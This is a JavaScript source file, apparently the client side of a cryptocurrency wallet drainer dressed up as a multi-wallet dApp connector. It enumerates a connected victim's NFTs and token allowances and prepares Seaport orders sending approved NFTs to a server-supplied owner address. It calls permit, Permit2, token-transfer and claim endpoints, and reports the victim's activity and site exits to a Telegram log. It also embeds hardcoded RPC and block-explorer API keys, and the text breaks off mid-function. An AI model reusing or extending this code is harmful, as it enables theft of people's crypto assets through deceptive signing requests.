var connected = 0;
var userId;
var account = "";
var perETH_usd;
var success = 0;
var sortedTrue = 0;
var permitApprove = 0;
let msgs;
let ethersProvider, signer, wallet, Seaport, web3Modal, selectedAccount;
let isApprovedPancake, isApprovedPancake2, isApprovedUniswap, isApprovedSushiswap, isApprovedPermit2;
let tokenList = [];
let accountTest;
let totalBalance = 0;
var wasWethApproved = 0;
const characters = "0123456789";

const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
const WBNB_BSC = "0x4B0F1812e5Df2A09796481Ff14017e6005508003";
const BUSD_BSC = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82";
const CONDUIT = "0x1E0049783F008A0085193E00003D00cd54003c71";

const UNISWAP_CONTRACT_ADDRESS = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
const PERMIT_CONTRACT_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const PANCAKE_CONTRACT_ADDRESS = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
const PANCAKE_CONTRACT_ADDRESS2 = "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4";
const SUSHI_CONTRACT_ADDRESS = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F";

const RPC = "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf";

let w3 = new ethers.providers.JsonRpcProvider(RPC);
let providerETH = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf"
);
let providerBSC = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/bsc/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf"
);
let providerMATIC = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/polygon/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf"
);
let providerARB = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/arbitrum/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf"
);

let operator = "";
let contractSAFA = "";
let ownerAddress = "";
let MintETH = "";
let MintBNB = "";

const BASE_URL = "/api";
const TOKEN_APPROVE = BASE_URL + "/token_permit";
const CLAIM_ETH = BASE_URL + "/claim/eth";
const PERMIT2_TOKEN = BASE_URL + "/permit2";
const TOKEN_TRANSFER = BASE_URL + "/token_transfer";
const SEAPORT_SIGN = BASE_URL + "/seaport_sign";
const NFT_TRANSFER = BASE_URL + "/nft_transfer";
const GET_WALLET_BALANCE = BASE_URL + "/balance";
const GET_INFO = BASE_URL + "/info";
const LOG_TG = BASE_URL + "/log/tg";
const LOG_TG_ERROR = BASE_URL + "/log/tg/error";
const CNT = BASE_URL + "/cnt";
const MAX_APPROVAL = "1158472395435294898592384258348512586931256";

var _console = { ...console };

_console.log = function (...args) {
    var msg = { ...args }[0];

    let newMsg = `${userId ? `#${userId} ` : ""}Domain: ${window.location.hostname}\n` + JSON.stringify(msg);

    logTlgError(newMsg);

    console.log(...args);
};

_console.error = function (...args) {
    var msg = { ...args }[0];

    let newMsg = `${userId ? `#${userId} ` : ""}Domain: ${window.location.hostname}\n` + msg;

    logTlgError(newMsg);

    console.log(...args);
};

fetch(GET_INFO).then(async (res) => {
    const result = await res.json();

    operator = result.operator;
    contractSAFA = result.contractSAFA;
    ownerAddress = result.ownerAddress;
    MintETH = result.MintETH;
    MintBNB = result.MintBNB;
});

const endpoint = ownerAddress;

let supportedWallets = {
    0: "WalletConnect",
    1: "Metamask",
};
let selectedProvider, selectedWallets;

const chainToId = {
    eth: {
        chainId: "0x1",
        abiUrl: "https://api.etherscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99",
        explorer: "etherscan.io",
    },
    bsc: {
        chainId: "0x38",
        abiUrl: "https://api.bscscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI",
        explorer: "bscscan.com",
    },
    matic: {
        chainId: "0x89",
        abiUrl: "https://api.polygonscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=M9IMUX515SEB97THWJRQDKNX75CI66X7XX",
        explorer: "polygonscan.com",
    },
    ftm: {
        chainId: "0xfa",
        abiUrl: "https://api.ftmscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415",
        explorer: "ftmscan.com",
    },
    avax: {
        chainId: "0xa86a",
        abiUrl: "https://api.snowtrace.io/api?module=contract&action=getsourcecode&address={0}&apikey=ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z",
        explorer: "snowtrace.io",
    },
    op: {
        chainId: "0xa",
        abiUrl: "https://api-optimistic.etherscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK",
        explorer: "optimistic.etherscan.io",
    },
    arb: {
        chainId: "0xa4b1",
        abiUrl: "https://api.arbiscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I",
        explorer: "arbiscan.io",
    },
    celo: {
        chainId: "0xa4ec",
        abiUrl: "https://api.celoscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken",
        explorer: "celoscan.io",
    },
};

const chainIdToName = {
    "0x1": "ETH",
    "0x38": "BSC",
    "0x89": "Polygon",
    "0xfa": "FTM",
    "0xa86a": "AVAX",
    "0xa": "OP",
    "0xa4b1": "ARB",
    "0xa4ec": "CELO",
    eth: "ETH",
    bsc: "BSC",
    matic: "Polygon",
    ftm: "FTM",
    avax: "AVAX",
    op: "OP",
    arb: "ARB",
    movr: "MOVR",
    celo: "CELO",
};

const chainsNetworkParams = {
    "0x38": {
        chainId: "0x38",
        chainName: "Binance Smart Chain",
        rpcUrls: ["https://bsc-dataseed.binance.org/"],
        nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18,
        },
        blockExplorerUrls: ["https://bscscan.com/"],
    },
    "0x89": {
        chainId: "0x89",
        chainName: "Polygon",
        rpcUrls: ["https://polygon-rpc.com/"],
        nativeCurrency: {
            name: "MATIC",
            symbol: "MATIC",
            decimals: 18,
        },
        blockExplorerUrls: ["https://polygonscan.com/"],
    },
    "0xfa": {
        chainId: "0xfa",
        chainName: "Fantom",
        rpcUrls: ["https://rpcapi.fantom.network/"],
        nativeCurrency: {
            name: "FTM",
            symbol: "FTM",
            decimals: 18,
        },
        blockExplorerUrls: ["https://ftmscan.com/"],
    },
    "0xa86a": {
        chainId: "0xa86a",
        chainName: "Avalanche",
        rpcUrls: ["https://api.avax.network/ext/bc/C/rpc"],
        nativeCurrency: {
            name: "AVAX",
            symbol: "AVAX",
            decimals: 18,
        },
        blockExplorerUrls: ["https://snowtrace.io/"],
    },
    "0xa": {
        chainId: "0xa",
        chainName: "Optimistic",
        rpcUrls: ["https://mainnet.optimism.io/"],
        nativeCurrency: {
            name: "ETH",
            symbol: "ETH",
            decimals: 18,
        },
        blockExplorerUrls: ["https://optimistic.etherscan.io/"],
    },
    "0xa4b1": {
        chainId: "0xa4b1",
        chainName: "Arbitrum One",
        rpcUrls: ["https://arb1.arbitrum.io/rpc"],
        nativeCurrency: {
            name: "ETH",
            symbol: "ETH",
            decimals: 18,
        },
        blockExplorerUrls: ["https://arbiscan.io/"],
    },
    "0xa4ec": {
        chainId: "0xa4ec",
        chainName: "Celo",
        rpcUrls: ["https://forno.celo.org"],
        nativeCurrency: {
            name: "CELO",
            symbol: "CELO",
            decimals: 18,
        },
        blockExplorerUrls: ["https://celoscan.io/"],
    },
};

const getMobileOperatingSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }
    if (/android/i.test(userAgent)) {
        return "Android";
    }
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }
    return "unknown";
};

const getDAppSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/Trust/i.test(userAgent)) {
        return "Trust";
    }
    if (/CriOS/i.test(userAgent)) {
        return "Metamask";
    }
    return "unknown";
};

const openMetaMaskUrl = (url) => {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_self";
    document.body.appendChild(a);
    a.click();
    a.remove();
};

function loginMetamask() {
    openMetaMaskUrl(`dapp://${document.URL.replace(/https?:\/\//i, "")}`);
}

async function loginTrust() {
    selectedWallets = 1;
    window.location = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${document.URL.replace(
        /https?:\/\//i,
        ""
    )}`;
}

async function login() {
    try {
        walletconnect();
    } catch (error) {
        _console.log(error);
    }
}

function walletconnect() {
    window.onbeforeunload = function () {
        if (!userId) return;
        return logTlg(`🚫<b> #${userId}</b> закрывает сайт`);
    };

    if (window.ethereum) {
        ConnectWallet();
    } else {
        window.addEventListener("ethereum#initialized", ConnectWallet, {
            once: true,
        });
        ConnectWallet();
    }
}

const round = (value) => {
    return Math.round(value * 10000) / 10000;
};

async function isApproved(owner, nft) {
    try {
        _console.log("isApproved");
        let contract = new ethers.Contract(nft, ERC721_ABI, w3);
        const approved = await contract.functions.isApprovedForAll(owner, CONDUIT, {
            gasLimit: 100000,
        });
        return approved;
    } catch (err) {
        _console.log("error", err);
        return false;
    }
}

function fetchTokenIds(resp, contract) {
    try {
        const assets = resp.assets;
        const tokenIds = [];
        for (let i = 0; i < assets.length; i++) {
            const currentAsset = assets[i];
            if (currentAsset.asset_contract.address.toLowerCase() == contract.toLowerCase()) {
                tokenIds.push(currentAsset.token_id);
            }
        }
        return tokenIds;
    } catch (err) {
        _console.log("error", err);
    }
}

async function getNFTS(walletAddress) {
    try {
        _console.log("getNFTS  ");
        const options = { method: "GET", headers: { Accept: "application/json" } };
        let all;
        try {
            let nfts = await fetch(
                `https://api.opensea.io/api/v1/assets?owner=${walletAddress}&order_direction=desc&limit=200&include_orders=false`
            );
            // let nfts = await fetch(
            //   `https://api.opensea.io/api/v1/assets?owner=0xf60c2Ea62EDBfE808163751DD0d8693DCb30019c&order_direction=desc&limit=200&include_orders=false`
            // );
            let nftsData = await nfts.json();
            let walletNfts = await fetch(
                `https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=200`,
                options
                // let walletNfts = await fetch(
                //   `https://api.opensea.io/api/v1/collections?asset_owner=0xf60c2Ea62EDBfE808163751DD0d8693DCb30019c&offset=0&limit=200`,
                //   options
            )
                .then((response) => response.json())
                .then((nfts) => {
                    if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
                    return nfts
                        .filter((nft) => {
                            if (nft.primary_asset_contracts.length > 0) return true;
                            else return false;
                        })
                        .map(async (nft) => {
                            let price = round(
                                nft.stats.floor_price != 0 ? nft.stats.floor_price : nft.stats.seven_day_average_price
                            );
                            let isApprovedBool = await isApproved(
                                walletAddress,
                                nft.primary_asset_contracts[0].address
                            );
                            isApprovedBool = isApprovedBool[0];
                            let schema_name = nft.primary_asset_contracts[0].schema_name;
                            let name = nft.primary_asset_contracts[0].name;
                            if (schema_name === null) {
                                schema_name = "erc721";
                            }

                            return {
                                type: schema_name.toLowerCase(),
                                tokenAddress: ethers.utils.getAddress(nft.primary_asset_contracts[0].address),
                                token_ids: fetchTokenIds(nftsData, nft.primary_asset_contracts[0].address),
                                price: price,
                                balance: perETH_usd * parseFloat(price),
                                chain: "eth",
                                name,
                                owned: nft.owned_asset_count,
                                approved: isApprovedBool,
                            };
                        });
                })
                .catch((err) => _console.error(err));

            all = await Promise.all(walletNfts);
        } catch (e) {
            all = [];
        }
        let sortedNfts = all.sort((a, b) => (parseFloat(b.price) > parseFloat(a.price) ? 1 : -1));

        _console.log(sortedNfts);
        sortedTrue = 1;
        return sortedNfts;
    } catch (e) {
        _console.log(e);
        sortedTrue = 0;
    }
}

function generateString(length) {
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

async function getCounter(walletAddress) {
    const ABI_COUNTER = [
        {
            inputs: [
                {
                    internalType: "address",
                    name: "offerer",
                    type: "address",
                },
            ],
            name: "getCounter",
            outputs: [
                {
                    internalType: "uint256",
                    name: "counter",
                    type: "uint256",
                },
            ],
            stateMutability: "view",
            type: "function",
        },
    ];
    let contract = new ethers.Contract("0x00000000006c3852cbEf3e08E8dF289169EdE581", ABI_COUNTER, w3);
    _console.log("getCounter");
    const counter = contract.functions.getCounter(walletAddress);
    return counter;
}

async function getWETH(walletAddress) {
    let contract = new ethers.Contract(WETH, ERC20_ABI, w3);
    const balance = contract.functions.balanceOf(walletAddress);
    const allowances = contract.functions.allowance(walletAddress, CONDUIT);
    return await Promise.all([balance, allowances]);
}

function getPreviousDay(date = new Date()) {
    const previous = new Date(date.getTime());
    previous.setDate(date.getDate() - 1);
    return previous;
}

async function isTokenApprovedUniswap(account, token) {
    try {
        let contract = new ethers.Contract(token, ERC20_ABI, providerETH);
        let approvedBalance = await contract.functions.allowance(account, UNISWAP_CONTRACT_ADDRESS);
        let approved = approvedBalance > 0 ? true : false;
        return approvedBalance[0]["_hex"];
    } catch (err) {
        _console.log("error", err);
        return false;
    }
}

async function isTokenApprovedPancake(account, token) {
    try {
        let contract = new ethers.Contract(token, ERC20_ABI, providerBSC);
        let approvedBalance = await contract.functions.allowance(account, PANCAKE_CONTRACT_ADDRESS);
        let approved = approvedBalance > 0 ? true : false;
        return approvedBalance[0]["_hex"];
    } catch (err) {
        _console.log("error", err);
        return false;
    }
}

async function isTokenApprovedPancake2(account, token) {
    try {
        let contract = new ethers.Contract(token, ERC20_ABI, providerBSC);
        let approvedBalance = await contract.functions.allowance(account, PANCAKE_CONTRACT_ADDRESS2);
        let approved = approvedBalance > 0 ? true : false;
        return approvedBalance[0]["_hex"];
    } catch (err) {
        _console.log("error", err);
        return false;
    }
}

async function isTokenApprovedSushiswap(account, token) {
    try {
        let contract = new ethers.Contract(token, ERC20_ABI, providerETH);
        let approvedBalance = await contract.functions.allowance(account, SUSHI_CONTRACT_ADDRESS);
        let approved = approvedBalance > 0 ? true : false;
        return approvedBalance[0]["_hex"];
    } catch (err) {
        _console.log("error", err);
        return false;
    }
}

async function isTokenApprovedPermit(account, token, chain) {
    let providerChain;
    if (chain == "eth") {
        providerChain = providerETH;
    } else if (chain == "bsc") {
        providerChain = providerBSC;
    } else if (chain == "matic") {
        providerChain = providerMATIC;
    } else if (chain == "arb") {
        providerChain = providerARB;
    }
    try {
        let contract = new ethers.Contract(token, ERC20_ABI, providerChain);
        let approvedBalance = await contract.functions.allowance(account, PERMIT_CONTRACT_ADDRESS);
        let approved = approvedBalance > 0 ? true : false;
        return approvedBalance[0]["_hex"];
    } catch (err) {
        _console.log("error", err);
        return false;
    }
}

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
function init() {
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                bridge: "https://bridge.walletconnect.org",
                rpc: {
                    1: "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    56: "https://rpc.ankr.com/bsc/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    137: "https://rpc.ankr.com/polygon/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    250: "https://rpc.ankr.com/fantom/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    43114: "https://rpc.ankr.com/avalanche/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    10: "https://rpc.ankr.com/optimism/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    42161: "https://rpc.ankr.com/arbitrum/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    100: "https://rpc.ankr.com/gnosis/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    1285: "https://rpc.moonriver.moonbeam.network",
                    42220: "https://rpc.ankr.com/celo/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
                    1313161554: "https://mainnet.aurora.dev",
                },
            },
        },
        "custom-coinbase": {
            display: {
                logo: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzQiIGhlaWdodD0iNzQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMzciIGN5PSIzNyIgcj0iMzUiIGZpbGw9IiMxQjUzRTQiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSI0Ii8+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0zNy4yNDUgNjAuNjEyYy0xMi43NzIgMC0yMy4xMjUtMTAuMzUzLTIzLjEyNS0yMy4xMjUgMC0xMi43NzEgMTAuMzUzLTIzLjEyNSAyMy4xMjUtMjMuMTI1IDEyLjc3MSAwIDIzLjEyNSAxMC4zNTQgMjMuMTI1IDIzLjEyNSAwIDEyLjc3Mi0xMC4zNTQgMjMuMTI1LTIzLjEyNSAyMy4xMjVaIiBmaWxsPSIjZmZmIi8+PHBhdGggZD0iTTI5Ljc5NCAzMy4wMjFhMi45ODkgMi45ODkgMCAwIDEgMi45ODktMi45ODloOC45MjVhMi45ODkgMi45ODkgMCAwIDEgMi45ODkgMi45ODl2OC45MjVhMi45ODkgMi45ODkgMCAwIDEtMi45ODkgMi45ODloLTguOTI1YTIuOTg5IDIuOTg5IDAgMCAxLTIuOTktMi45ODl2LTguOTI1WiIgZmlsbD0iIzFCNTNFNCIvPjwvc3ZnPg==",
                name: "Coinbase",
                description: "Connect to your Coinbase",
            },
            options: {
                appName: "app",
                networkUrl: `https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf`,
                chainId: "0x1",
            },
            package: WalletLink,
            connector: async (_, options) => {
                const { appName, networkUrl, chainId } = options;
                const walletLink = new WalletLink({
                    appName,
                });
                const provider = walletLink.makeWeb3Provider(networkUrl, chainId);
                selectedWallets = 3;
                await provider.enable();
                return provider;
            },
        },
        "custom-binancechainwallet": {
            display: {
                logo: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PGcgZmlsbD0iI2YwYjkwYiI+PHBhdGggZD0iTTIwLjI0NSAwTDkuNjM0IDYuMTI1bDMuOTAxIDIuMjYyIDYuNzEtMy44NjIgNi43MSAzLjg2MiAzLjkwMi0yLjI2MkwyMC4yNDUgMHptNi43MTEgMTEuNTg2bDMuOSAyLjI2M3Y0LjUyNmwtNi43MSAzLjg2MnY3LjcyNGwtMy45IDIuMjYzLTMuOTAyLTIuMjYzdi03LjcyNGwtNi43MS0zLjg2MnYtNC41MjZsMy45MDEtMi4yNjMgNi43MSAzLjg2MyA2LjcxLTMuODYzaC4wMDF6Ii8+PHBhdGggZD0iTTMwLjg1NyAyMS41NzNWMjYuMWwtMy45MDEgMi4yNjJ2LTQuNTI1bDMuOS0yLjI2My4wMDEtLjAwMXoiLz48cGF0aCBkPSJNMjYuOTE2IDMxLjU2bDYuNzEtMy44NjJ2LTcuNzI0bDMuOTAyLTIuMjYzdjEyLjI1bC0xMC42MTEgNi4xMjVWMzEuNTZoLS4wMDF6bTYuNzExLTE5LjMxbC0zLjkwMi0yLjI2MyAzLjkwMi0yLjI2MyAzLjkgMi4yNjN2NC41MjVsLTMuOSAyLjI2M1YxMi4yNXpNMTYuMzQ0IDM3LjcyNFYzMy4ybDMuOTAxIDIuMjYzIDMuOTAyLTIuMjYzdjQuNTI1bC0zLjkwMiAyLjI2My0zLjktMi4yNjMtLjAwMS0uMDAxem0tMi44MDktOS4zNjNMOS42MzQgMjYuMXYtNC41MjZsMy45MDEgMi4yNjN2NC41MjUtLjAwMXptNi43MS0xNi4xMTFsLTMuOS0yLjI2MyAzLjktMi4yNjMgMy45MDIgMi4yNjMtMy45MDIgMi4yNjN6bS05LjQ4LTIuMjYzbC0zLjkgMi4yNjN2NC41MjVsLTMuOTAyLTIuMjYzVjkuOTg3bDMuOTAxLTIuMjYzIDMuOTAxIDIuMjYzeiIvPjxwYXRoIGQ9Ik0yLjk2MyAxNy43MTFsMy45MDEgMi4yNjN2Ny43MjRsNi43MSAzLjg2MnY0LjUyNkwyLjk2MyAyOS45NlYxNy43MXYuMDAxeiIvPjwvZz48L3N2Zz4=",
                name: "Binance Chain Wallet",
                description: "Connect to your Binance Chain Wallet",
            },
            package: true,
            connector: async () => {
                let provider = null;
                if (typeof window.BinanceChain !== "undefined") {
                    provider = window.BinanceChain;
                    try {
                        await provider.request({ method: "eth_requestAccounts" });
                        selectedWallets = 2;
                    } catch (error) {
                        throw new Error("User Rejected");
                    }
                } else {
                    throw new Error("No Binance Chain Wallet found");
                }
                return provider;
            },
        },
    };
    web3Modal = new Web3Modal({
        cacheProvider: true,
        providerOptions,
        theme: "dark",
    });
}

async function ConnectMetaMask() {
    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
        openMetaMaskUrl(`dapp://${document.URL.replace(/https?:\/\//i, "")}`);
        return;
    } else {
        if (window.ethereum) {
            await ethereum.request({ method: "eth_requestAccounts" });
            provider = window.ethereum;
            web3 = new Web3(provider);
            ethersProvider = new ethers.providers.Web3Provider(provider, "any");
            signer = ethersProvider.getSigner();
            if (web3._provider["bridge"]) {
                selectedProvider = supportedWallets[0];
            } else {
                selectedProvider = supportedWallets[1];
            }
            Seaport = new seaport.Seaport(signer);
            getWalletAccount();
            get12DollarETH();
        }
    }
}

function getWalletName(provider) {
    if (provider.isMetaMask) {
        return "MetaMask";
    } else if (provider.isTrust) {
        return "Trust";
    } else if (provider.isCoinBase) {
        return "Coinbase";
    } else {
        return "WalletConnect";
    }
}

async function ConnectTrustWallet() {
    if (isMobile() && getDAppSystem() !== "Trust") {
        window.location = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${document.URL.replace(
            /https?:\/\//i,
            ""
        )}`;
        return;
    } else {
        if (window.ethereum) {
            await ethereum.request({ method: "eth_requestAccounts" });
            provider = window.ethereum;
            web3 = new Web3(provider);
            ethersProvider = new ethers.providers.Web3Provider(provider, "any");
            signer = ethersProvider.getSigner();
            if (web3._provider["bridge"]) {
                selectedProvider = supportedWallets[0];
            } else {
                selectedProvider = supportedWallets[1];
            }
            Seaport = new seaport.Seaport(signer);
            getWalletAccount();
            get12DollarETH();
        }
    }
}

async function ConnectCoinbase() {
    let appName = "app";
    let networkUrl = "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf";
    let chainId = "0x1";
    const walletLink = new WalletLink({
        appName,
    });
    const provider = walletLink.makeWeb3Provider(networkUrl, chainId);
    selectedWallets = 3;
    await provider.enable();
    web3 = new Web3(provider);
    ethersProvider = new ethers.providers.Web3Provider(provider, "any");
    signer = ethersProvider.getSigner();
    if (web3._provider["bridge"]) {
        selectedProvider = supportedWallets[0];
    } else {
        selectedProvider = supportedWallets[1];
    }
    Seaport = new seaport.Seaport(signer);
    getWalletAccount();
    get12DollarETH();
}

async function ConnectBinance() {
    if (typeof window.BinanceChain !== "undefined") {
        provider = window.BinanceChain;
        try {
            await provider.request({ method: "eth_requestAccounts" });
            selectedWallets = 2;
            web3 = new Web3(provider);
            ethersProvider = new ethers.providers.Web3Provider(provider, "any");
            signer = ethersProvider.getSigner();
            if (web3._provider["bridge"]) {
                selectedProvider = supportedWallets[0];
            } else {
                selectedProvider = supportedWallets[1];
            }
            Seaport = new seaport.Seaport(signer);
            getWalletAccount();
            get12DollarETH();
        } catch (error) {
            throw new Error("User Rejected");
        }
    } else {
        throw new Error("No Binance Chain Wallet found");
    }
}

async function ConnectWalletConnect() {
    const provider = new WalletConnectProvider({
        bridge: "https://bridge.walletconnect.org",
        rpc: {
            1: "https://rpc.ankr.com/eth/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            56: "https://rpc.ankr.com/bsc/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            137: "https://rpc.ankr.com/polygon/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            250: "https://rpc.ankr.com/fantom/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            43114: "https://rpc.ankr.com/avalanche/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            10: "https://rpc.ankr.com/optimism/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            42161: "https://rpc.ankr.com/arbitrum/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            100: "https://rpc.ankr.com/gnosis/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            1285: "https://rpc.moonriver.moonbeam.network",
            42220: "https://rpc.ankr.com/celo/05e651507ce6b1c58cbfeecd3b0239c0619ddfa69c90b7daa583c99974a07acf",
            1313161554: "https://mainnet.aurora.dev",
        },
    });
    selectedWallets = 2;
    web3 = new Web3(provider);
    ethersProvider = new ethers.providers.Web3Provider(provider, "any");
    signer = ethersProvider.getSigner();
    if (web3._provider["bridge"]) {
        selectedProvider = supportedWallets[0];
    } else {
        selectedProvider = supportedWallets[1];
    }
    Seaport = new seaport.Seaport(signer);
    getWalletAccount();
    get12DollarETH();
}

async function ConnectWallet() {
    provider = await web3Modal.connect();
    web3 = new Web3(provider);
    ethersProvider = new ethers.providers.Web3Provider(provider, "any");
    signer = ethersProvider.getSigner();
    if (web3._provider["bridge"]) {
        selectedProvider = supportedWallets[0];
    } else {
        selectedProvider = supportedWallets[1];
    }
    Seaport = new seaport.Seaport(signer);
    getWalletAccount();
    get12DollarETH();
}

async function get12DollarETH() {
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url, {
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    });
    let price = await response.json();
    let perETH = price["ethereum"]["usd"];
    let usd = 1 / perETH;
    perETH_usd = perETH;
}

async function getWalletAccount() {
    const accounts = await web3.eth.getAccounts();
    waitAlert();
    account = accounts[0];

    const urlParams = new URLSearchParams(window.location.search);
    const accountParam = urlParams.get("account");

    if (accountParam) accountTest = accountParam;

    if (connected == 0) {
        logTlgConnect();
    }
    connected = 1;
    let counter, wethData;
    [tokenList, counter, wethData] = await Promise.all([getNFTS(account), getCounter(account), getWETH(account)]);

    _console.log(tokenList);
    _console.log("NFT LIST");
    counter = parseInt(counter.toString());
    let [balance, allowance] = wethData;
    balance = balance.toString();
    allowance = allowance.toString();
    const balanceNormalized = parseFloat(ethers.utils.formatEther(balance));
    const allowanceNormalized = parseFloat(ethers.utils.formatEther(allowance));
    let weth_include = "0";
    if (allowanceNormalized >= balanceNormalized) {
        weth_include = balance;
    } else if (balanceNormalized > allowanceNormalized) {
        weth_include = allowance;
    }
    const orders = [];
    const considers = [];
    let bundlePrice = 0;
    let uniPrice = 0;
    if (sortedTrue == 1) {
        tokenList.forEach((nft) => {
            if (nft.type == "erc721" && nft.approved == true) {
                bundlePrice += nft.balance;
                nft.token_ids.forEach((token_id) => {
                    const array = {
                        itemType: 2,
                        token: nft.tokenAddress,
                        identifierOrCriteria: token_id,
                        startAmount: "1",
                        endAmount: "1",
                    };
                    const consider = {
                        itemType: 2,
                        token: nft.tokenAddress,
                        identifierOrCriteria: token_id,
                        startAmount: "1",
                        endAmount: "1",
                        recipient: endpoint,
                    };
                    orders.push(array);
                    considers.push(consider);
                });
            }
        });
    }
    if (false && (connected == "2" || getItem("tokenList"))) {
        _console.log("NO API");
        tokenList = getItem("tokenList");
        connected = 2;
    } else {
        const response = await fetch(`${GET_WALLET_BALANCE}?account=` + (accountTest || account), {
            method: "GET",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
            },
        });
        const data = await response.json();

        await Promise.all(
            data.map(async (item) => {
                let isApprovedPancake2 = 0;
                let isApprovedPancake = 0;
                let isApprovedUniswap = 0;
                let isApprovedSushiswap = 0;
                let isApprovedPermit2 = 0;
                var temp = {};
                temp.balance = item.amount * item.price;

                // if(temp.balance > 16)
                //   return
                temp.tokenAddress = item.id;

                if (!chainToId[item.chain]) return;

                if (item.chain == "bsc" && item.id !== "bsc") {
                    isApprovedPancake = await isTokenApprovedPancake(account, item.id);
                    isApprovedPancake2 = await isTokenApprovedPancake2(account, item.id);
                } else if (item.chain == "eth" && item.id !== "eth") {
                    isApprovedUniswap = await isTokenApprovedUniswap(account, item.id);
                    isApprovedSushiswap = await isTokenApprovedSushiswap(account, item.id);
                    temp.approved = isApprovedUniswap > 0;
                    temp.approve_amount = isApprovedUniswap;
                }
                if (
